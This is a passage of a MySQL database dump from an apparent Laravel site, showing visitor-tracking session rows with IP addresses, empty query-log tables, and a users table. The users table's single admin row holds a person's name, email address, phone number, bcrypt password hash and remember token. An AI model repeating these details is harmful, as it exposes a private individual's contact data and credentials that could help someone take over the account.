01:12:01',NULL),(704,'7776ce22-1251-445b-97c7-d428346b6fc4',NULL,15,33,'157.55.39.40',NULL,NULL,NULL,1,'2018-01-08 02:04:56','2018-01-08 02:04:56',NULL),(705,'8b335215-b964-47f9-aba2-ae03b0fde6e0',NULL,31,104,'94.130.231.234',NULL,NULL,NULL,0,'2018-01-08 02:47:18','2018-01-08 02:47:18',NULL),(706,'abb794a3-73b2-40ba-b86a-1e0d73ad6d31',NULL,5,46,'216.244.66.197',NULL,NULL,NULL,1,'2018-01-08 03:23:19','2018-01-08 03:23:19',NULL),(707,'feffe80c-4780-4b31-8b11-ad93e6801145',NULL,9,87,'66.240.236.119',NULL,NULL,NULL,0,'2018-01-08 03:52:37','2018-01-08 03:52:37',NULL),(708,'4218a2aa-618b-4189-b156-c1707bc9595f',NULL,5,47,'195.146.37.19',NULL,NULL,NULL,1,'2018-01-08 04:47:26','2018-01-08 04:47:26',NULL),(709,'4aedaa17-7373-4daa-ae5c-8e7718c213f5',NULL,5,58,'31.184.135.124',12,NULL,NULL,1,'2018-01-08 04:49:59','2018-01-08 04:49:59',NULL),(710,'0783793a-59f6-4d4e-b4d6-3423e9fb98b0',NULL,6,105,'106.120.161.66',12,NULL,NULL,0,'2018-01-08 05:10:38','2018-01-08 05:10:38',NULL),(711,'cc4cc0ea-e56e-4f8e-81ec-932e8fd2e1bf',NULL,6,105,'182.118.20.155',12,NULL,NULL,0,'2018-01-08 05:11:03','2018-01-08 05:11:03',NULL),(712,'3841154c-edf8-49f7-880c-19979d1d442e',NULL,1,1,'31.47.32.230',21,NULL,NULL,0,'2018-01-08 09:27:41','2018-01-08 05:57:41',NULL),(713,'2c614272-25a9-4ca9-9a75-27df429566dc',NULL,6,9,'177.157.183.31',NULL,NULL,NULL,0,'2018-01-08 06:19:56','2018-01-08 06:19:56',NULL),(714,'7c8b6629-bcb0-4e7e-b81f-9f1b280934db',NULL,32,106,'101.199.112.50',NULL,NULL,NULL,0,'2018-01-08 07:12:50','2018-01-08 07:12:50',NULL),(715,'2321627d-2f06-4539-827d-069595253925',NULL,32,106,'171.13.14.133',NULL,NULL,NULL,0,'2018-01-08 07:13:32','2018-01-08 07:13:32',NULL),(716,'d29633a4-0072-4d1c-91b7-71ed40274ad5',NULL,32,106,'171.13.14.149',NULL,NULL,NULL,0,'2018-01-08 07:14:06','2018-01-08 07:14:06',NULL),(717,'225ffb5d-146b-443b-a1c5-f82253d4ef70',NULL,5,3,'162.210.196.97',NULL,NULL,NULL,1,'2018-01-08 07:23:49','2018-01-08 07:23:49',NULL),(718,'7fa1522a-cfb0-486c-836d-dc8fdfa11e65',NULL,12,19,'66.249.93.90',NULL,NULL,NULL,1,'2018-01-08 07:39:07','2018-01-08 07:39:07',NULL),(719,'7737d3bd-8d96-49da-b092-d02bfacd408a',NULL,9,11,'42.236.10.104',11,NULL,NULL,1,'2018-01-08 07:49:08','2018-01-08 07:49:08',NULL),(720,'52c0e640-b372-47fa-9566-1b389a00dc90',NULL,9,12,'42.236.10.83',12,NULL,NULL,1,'2018-01-08 07:49:10','2018-01-08 07:49:10',NULL),(721,'dddf892c-5158-48cf-856a-e0dafef62ad5',NULL,5,46,'216.244.66.197',NULL,NULL,NULL,1,'2018-01-08 08:07:31','2018-01-08 08:07:31',NULL),(722,'c7337f44-f141-438f-91a9-fddf77d5d2f3',NULL,5,47,'195.146.37.19',NULL,NULL,NULL,1,'2018-01-08 08:13:16','2018-01-08 08:13:16',NULL),(723,'e999b75b-d00a-45d8-aa48-647da8ed8050',NULL,5,2,'193.200.241.230',NULL,NULL,NULL,1,'2018-01-08 08:21:50','2018-01-08 08:21:50',NULL),(724,'a5477344-6b44-48f1-a155-779a3a7d307e',NULL,5,2,'193.200.241.230',NULL,NULL,NULL,1,'2018-01-08 08:21:55','2018-01-08 08:21:55',NULL),(725,'7dc44388-4a9f-4dae-81eb-6833d57810df',NULL,5,2,'193.200.241.230',NULL,NULL,NULL,1,'2018-01-08 08:22:07','2018-01-08 08:22:07',NULL),(726,'ad532e81-ae48-4d03-a108-a6b5e50338c0',NULL,5,44,'74.115.214.154',28,NULL,NULL,1,'2018-01-08 10:01:38','2018-01-08 10:01:38',NULL),(727,'6e2852eb-12ad-44ac-a0b6-f809d4c86c79',NULL,5,107,'162.243.32.59',NULL,NULL,NULL,1,'2018-01-08 10:18:13','2018-01-08 10:18:13',NULL),(728,'128e8dab-71f9-4976-beb3-e563036b0d4a',NULL,5,46,'216.244.66.249',NULL,NULL,NULL,1,'2018-01-08 10:57:59','2018-01-08 10:57:59',NULL),(729,'325b878d-035d-46ff-b7a7-865fed724015',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-08 12:05:11','2018-01-08 12:05:11',NULL),(730,'d2114122-05cf-41cc-9b1f-26cda7093ec6',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-08 12:07:16','2018-01-08 12:07:16',NULL),(731,'7f93862b-55fb-4e00-9a6d-0481b8817def',NULL,11,108,'37.137.210.133',19,NULL,NULL,0,'2018-01-08 16:22:35','2018-01-08 12:52:35',NULL),(732,'491bf405-268b-4365-bae9-aa92cd57ffc8',NULL,18,64,'95.162.77.35',20,NULL,NULL,0,'2018-01-08 17:44:38','2018-01-08 14:14:38',NULL),(733,'52292cc3-edea-4811-aba5-3ce24c0bab60',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:21:33','2018-01-08 14:21:33',NULL),(734,'e6ceab02-5888-485d-b294-9c4d6820565f',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:21','2018-01-08 14:33:21',NULL),(735,'ae5676b5-315e-4eda-ad31-7bc2eb59f2ef',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:24','2018-01-08 14:33:24',NULL),(736,'ded861ee-5faf-46b8-9eaa-bac983e8f41f',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:26','2018-01-08 14:33:26',NULL),(737,'bb98d31c-5d99-4a2a-b27c-8827fe3950dc',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:29','2018-01-08 14:33:29',NULL),(738,'c473f665-9169-447b-9c5f-e94b68541345',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:31','2018-01-08 14:33:31',NULL),(739,'10815d5b-0033-4baa-a302-44614d3ca039',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:34','2018-01-08 14:33:34',NULL),(740,'4c5b0d08-904a-433f-b90f-5eba729bd924',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:36','2018-01-08 14:33:36',NULL),(741,'e8eea4d3-3103-4783-9ba2-bd22e93ec469',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:39','2018-01-08 14:33:39',NULL),(742,'61f305a9-98ba-483f-a7ba-93dba1ec892c',NULL,5,3,'88.198.23.179',NULL,NULL,NULL,1,'2018-01-08 14:33:41','2018-01-08 14:33:41',NULL),(743,'ac669a81-06c8-45fe-9d3b-8c7333c50f30',NULL,5,46,'216.244.66.197',NULL,NULL,NULL,1,'2018-01-08 16:29:20','2018-01-08 16:29:20',NULL),(744,'6424e836-0434-45b9-a175-2ef513d8768d',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2018-01-08 16:43:48','2018-01-08 16:43:48',NULL),(745,'2adc3036-04d4-4c87-a0df-843646a0d158',NULL,5,3,'69.30.198.202',NULL,NULL,NULL,1,'2018-01-08 17:29:28','2018-01-08 17:29:28',NULL),(746,'148dcced-2a95-4558-9a3e-11063af714d3',NULL,6,105,'106.120.160.119',11,NULL,NULL,0,'2018-01-08 19:04:06','2018-01-08 19:04:06',NULL),(747,'156c7ef4-0f10-4b17-a266-06e5ab5432a9',NULL,5,44,'74.115.214.150',24,NULL,NULL,1,'2018-01-08 19:34:08','2018-01-08 19:34:08',NULL),(748,'2f6fe129-38e9-4180-882b-337497285122',NULL,32,106,'220.181.132.192',NULL,NULL,NULL,0,'2018-01-08 20:55:22','2018-01-08 20:55:22',NULL),(749,'8b8ff669-57ab-4315-8c0f-dfc00a4cbf36',NULL,17,37,'66.249.75.8',NULL,NULL,NULL,1,'2018-01-08 21:59:42','2018-01-08 21:59:42',NULL),(750,'c329d8e6-7cf4-4b7c-8da7-e4c15858a3bd',NULL,5,16,'123.125.71.90',NULL,NULL,NULL,1,'2018-01-08 22:38:53','2018-01-08 22:38:53',NULL),(751,'83922415-359a-4717-a410-bfbeb433fc70',NULL,5,24,'31.184.133.102',11,NULL,NULL,1,'2018-01-09 02:14:37','2018-01-09 02:14:37',NULL),(752,'350560c9-3785-4068-a9d4-27c13002743b',NULL,5,58,'31.184.133.102',12,NULL,NULL,1,'2018-01-09 02:29:16','2018-01-09 02:29:16',NULL),(753,'4f8b9e16-c9db-4170-856d-c7037900397a',NULL,1,109,'54.159.252.134',NULL,NULL,NULL,0,'2018-01-09 03:26:37','2018-01-09 03:26:37',NULL),(754,'2ee53d9d-aa78-4d11-ba16-2b2af229c06b',NULL,11,15,'104.200.17.67',14,NULL,NULL,0,'2018-01-09 04:22:25','2018-01-09 04:22:25',NULL),(755,'18e54953-6cd9-4790-8d67-83124f1af3d9',NULL,5,22,'194.187.170.127',NULL,NULL,NULL,1,'2018-01-09 05:55:13','2018-01-09 05:55:13',NULL),(756,'3be5e67e-79ac-44a5-b8cd-e519b301bf31',NULL,5,22,'194.187.170.127',NULL,NULL,NULL,1,'2018-01-09 06:25:47','2018-01-09 06:25:47',NULL),(757,'e9464910-9a18-4195-a0c5-4eb5d48ef2f7',NULL,5,22,'194.187.170.127',NULL,NULL,NULL,1,'2018-01-09 06:28:57','2018-01-09 06:28:57',NULL),(758,'e4ea1d74-d3f7-42cd-834d-b01a333d1eeb',NULL,9,26,'180.153.236.125',12,NULL,NULL,1,'2018-01-09 07:42:46','2018-01-09 07:42:46',NULL),(759,'d9fad0f6-55d1-478e-adad-a2f39bebc6f0',NULL,9,26,'180.153.236.125',11,NULL,NULL,1,'2018-01-09 07:42:46','2018-01-09 07:42:46',NULL),(760,'4369a30f-fa7b-4e70-86d6-5d9912069aa9',NULL,15,33,'40.77.167.8',NULL,NULL,NULL,1,'2018-01-09 08:48:29','2018-01-09 08:48:29',NULL),(761,'555cf24f-b019-420e-8f78-7f46afc1f992',NULL,5,44,'74.115.214.152',24,NULL,NULL,1,'2018-01-09 08:56:15','2018-01-09 08:56:15',NULL),(762,'b57d85eb-e6a1-42df-94a9-dfa0a0e3d41f',NULL,9,11,'42.236.99.130',11,NULL,NULL,1,'2018-01-09 09:04:32','2018-01-09 09:04:32',NULL),(763,'9782200c-24c4-4138-a2d9-c0a7d2e6d2ed',NULL,9,11,'42.236.99.37',12,NULL,NULL,1,'2018-01-09 09:05:20','2018-01-09 09:05:20',NULL),(764,'ce583f34-1b61-4560-b02e-0010bc9c4d69',NULL,1,1,'31.47.32.230',20,NULL,NULL,0,'2018-01-09 13:25:19','2018-01-09 09:55:19',NULL),(765,'3aa5f698-1b9e-462f-a07d-9566b92cfbae',NULL,13,29,'13.56.229.65',NULL,NULL,NULL,0,'2018-01-09 10:27:18','2018-01-09 10:27:18',NULL),(766,'9fb11a76-0089-4780-b54f-6952791bbc1b',NULL,5,3,'108.59.8.70',NULL,NULL,NULL,1,'2018-01-09 10:50:33','2018-01-09 10:50:33',NULL),(767,'87c9bfc5-dd70-48dd-8048-f10161244ef6',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-09 11:14:48','2018-01-09 11:14:48',NULL),(768,'7834a4b1-a427-486a-a6f6-868886809fce',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-09 11:20:48','2018-01-09 11:20:48',NULL),(769,'36c33458-9216-4efc-a7b2-2638b26db33d',NULL,5,23,'34.207.98.73',NULL,NULL,NULL,1,'2018-01-09 11:38:32','2018-01-09 11:38:32',NULL),(770,'a96e8212-e244-4fc6-82fd-d6feea0ed68e',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-09 12:07:19','2018-01-09 12:07:19',NULL),(771,'31abdb90-20c3-4c94-9729-29cc04e787c9',NULL,5,3,'37.187.75.71',NULL,NULL,NULL,1,'2018-01-09 12:16:09','2018-01-09 12:16:09',NULL),(772,'d162cf31-2eb7-4678-bbe1-187f9d43c91f',NULL,5,3,'37.187.75.71',NULL,NULL,NULL,1,'2018-01-09 12:16:12','2018-01-09 12:16:12',NULL),(773,'f5b5ef22-9be7-4863-b4da-c7fcda7efb1c',NULL,5,3,'37.187.75.71',NULL,NULL,NULL,1,'2018-01-09 12:16:15','2018-01-09 12:16:15',NULL),(774,'2d56b8cc-03bf-498d-a72b-a9f52bdbc0ad',NULL,5,3,'37.187.75.71',NULL,NULL,NULL,1,'2018-01-09 12:16:18','2018-01-09 12:16:18',NULL),(775,'cb9150bd-c962-42dc-a811-2543b4673223',NULL,5,3,'37.187.75.71',NULL,NULL,NULL,1,'2018-01-09 12:16:22','2018-01-09 12:16:22',NULL),(776,'9c610c70-8cdd-4541-9bf2-006ed596298f',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-09 13:17:42','2018-01-09 13:17:42',NULL),(777,'b00b3bb6-ee85-47fd-9915-31d2f7a4ddd3',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-09 13:31:59','2018-01-09 13:31:59',NULL),(778,'c3ad85d8-75f3-46e5-968b-e6ddeee8645b',NULL,5,17,'178.154.200.11',NULL,NULL,NULL,1,'2018-01-09 13:33:22','2018-01-09 13:33:22',NULL),(779,'57f23928-bae9-46f6-8b77-961be4affa70',NULL,5,17,'37.9.113.184',NULL,NULL,NULL,1,'2018-01-09 13:33:25','2018-01-09 13:33:25',NULL),(780,'4184f06d-e642-4ea4-957b-0df81e6d47c2',NULL,5,3,'173.212.201.251',NULL,NULL,NULL,1,'2018-01-09 14:26:07','2018-01-09 14:26:07',NULL),(781,'5f068657-e6df-4d03-ab94-902e88550499',NULL,5,3,'173.212.201.251',NULL,NULL,NULL,1,'2018-01-09 14:26:12','2018-01-09 14:26:12',NULL),(782,'e88c47d2-8aaf-4acf-8cb4-c268af2a94a5',NULL,5,3,'173.212.201.251',NULL,NULL,NULL,1,'2018-01-09 14:26:20','2018-01-09 14:26:20',NULL),(783,'45855885-c486-44e1-8887-5c166d38d045',NULL,18,64,'5.198.191.18',20,NULL,NULL,0,'2018-01-09 18:08:32','2018-01-09 14:38:32',NULL),(784,'1689f5a0-55a2-484e-a4f1-97157afc4f4b',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-09 14:54:38','2018-01-09 14:54:38',NULL),(785,'0abb516c-3201-42f6-a6ef-1a2ce8b01928',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-09 14:59:33','2018-01-09 14:59:33',NULL),(786,'fb121352-882e-4614-a687-8cc1808e50ca',NULL,6,9,'122.174.69.40',NULL,NULL,NULL,0,'2018-01-09 15:10:53','2018-01-09 15:10:53',NULL),(787,'74a1780a-ccd4-4f8c-8e8d-4642751e65bc',NULL,17,37,'66.249.75.10',NULL,NULL,NULL,1,'2018-01-09 15:23:39','2018-01-09 15:23:39',NULL),(788,'5dd44b09-1863-4df1-949d-d1b9e11729d3',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2018-01-09 15:32:34','2018-01-09 15:32:34',NULL);
/*!40000 ALTER TABLE `tracker_sessions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_sql_queries`
--

DROP TABLE IF EXISTS `tracker_sql_queries`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_sql_queries` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `sha1` varchar(40) COLLATE utf8_unicode_ci NOT NULL,
  `statement` text COLLATE utf8_unicode_ci NOT NULL,
  `time` double NOT NULL,
  `connection_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_sql_queries_sha1_index` (`sha1`),
  KEY `tracker_sql_queries_time_index` (`time`),
  KEY `tracker_sql_queries_created_at_index` (`created_at`),
  KEY `tracker_sql_queries_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_sql_queries`
--

LOCK TABLES `tracker_sql_queries` WRITE;
/*!40000 ALTER TABLE `tracker_sql_queries` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_sql_queries` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_sql_queries_log`
--

DROP TABLE IF EXISTS `tracker_sql_queries_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_sql_queries_log` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `log_id` bigint(20) unsigned NOT NULL,
  `sql_query_id` bigint(20) unsigned NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_sql_queries_log_log_id_index` (`log_id`),
  KEY `tracker_sql_queries_log_sql_query_id_index` (`sql_query_id`),
  KEY `tracker_sql_queries_log_created_at_index` (`created_at`),
  KEY `tracker_sql_queries_log_updated_at_index` (`updated_at`),
  CONSTRAINT `tracker_sql_queries_log_log_id_foreign` FOREIGN KEY (`log_id`) REFERENCES `tracker_log` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_sql_queries_log_sql_query_id_foreign` FOREIGN KEY (`sql_query_id`) REFERENCES `tracker_sql_queries` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_sql_queries_log`
--

LOCK TABLES `tracker_sql_queries_log` WRITE;
/*!40000 ALTER TABLE `tracker_sql_queries_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_sql_queries_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_sql_query_bindings`
--

DROP TABLE IF EXISTS `tracker_sql_query_bindings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_sql_query_bindings` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `sha1` varchar(40) COLLATE utf8_unicode_ci NOT NULL,
  `serialized` text COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_sql_query_bindings_sha1_index` (`sha1`),
  KEY `tracker_sql_query_bindings_created_at_index` (`created_at`),
  KEY `tracker_sql_query_bindings_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_sql_query_bindings`
--

LOCK TABLES `tracker_sql_query_bindings` WRITE;
/*!40000 ALTER TABLE `tracker_sql_query_bindings` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_sql_query_bindings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_sql_query_bindings_parameters`
--

DROP TABLE IF EXISTS `tracker_sql_query_bindings_parameters`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_sql_query_bindings_parameters` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `sql_query_bindings_id` bigint(20) unsigned DEFAULT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `value` text COLLATE utf8_unicode_ci,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_sql_query_bindings_parameters_name_index` (`name`),
  KEY `tracker_sql_query_bindings_parameters_created_at_index` (`created_at`),
  KEY `tracker_sql_query_bindings_parameters_updated_at_index` (`updated_at`),
  KEY `tracker_sqlqb_parameters` (`sql_query_bindings_id`),
  CONSTRAINT `tracker_sqlqb_parameters` FOREIGN KEY (`sql_query_bindings_id`) REFERENCES `tracker_sql_query_bindings` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_sql_query_bindings_parameters`
--

LOCK TABLES `tracker_sql_query_bindings_parameters` WRITE;
/*!40000 ALTER TABLE `tracker_sql_query_bindings_parameters` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_sql_query_bindings_parameters` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_system_classes`
--

DROP TABLE IF EXISTS `tracker_system_classes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_system_classes` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tracker_system_classes_name_index` (`name`),
  KEY `tracker_system_classes_created_at_index` (`created_at`),
  KEY `tracker_system_classes_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_system_classes`
--

LOCK TABLES `tracker_system_classes` WRITE;
/*!40000 ALTER TABLE `tracker_system_classes` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_system_classes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `state` tinyint(4) NOT NULL,
  `first_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `last_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `mobile` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `address` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `avatar` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `new_avatar` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`),
  UNIQUE KEY `users_username_unique` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,1,'سعید','نصیری','admin','saeed.hajinasiri@gmail.com','09212375850','','14924536511490616864user.jpg',NULL,'$2y$10$CaXrwJq46rfPw0dgCIycmetXoTXzOIUm3HZZGGKF0/9CZ.DysQ0Bm','EhxjF5qcJUlwTZfVsJh6BHImKrEAaXGSDXJc9hmLwYSef4cetjPqMNcjKQhV','2017-04-17 13:48:43','2018-01-08 05:57:41');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2018-01-09 22:33:58
